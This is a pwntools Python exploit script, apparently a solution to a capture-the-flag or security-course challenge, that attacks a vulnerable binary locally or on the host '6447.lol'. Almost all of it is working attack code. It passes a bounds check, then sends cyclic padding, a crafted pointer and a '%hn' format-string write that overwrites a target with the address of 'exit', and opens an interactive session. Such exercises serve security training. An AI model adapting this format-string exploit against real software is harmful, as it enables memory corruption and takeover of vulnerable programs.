#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 9001

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")

######################################
############## Exploit ###############
######################################

# break *(main + 296) - set a breakpoint at printf
# we pass bounds check by passing 127, which will look at buffer

def exploit():
    # payload = b'127'.ljust(123 * 48)
    payload = b''
    payload += cyclic(123 * 48 - len(payload)) 
    payload += p64(E.symbols['buf'] + len(payload) + 8)
    payload += f'%{0x1196}$c%3$hn'.encode().ljust(16)
    payload += p64(E.symbols['exit'])
    # first pointer -> format string
    P.sendline(payload)
    P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()
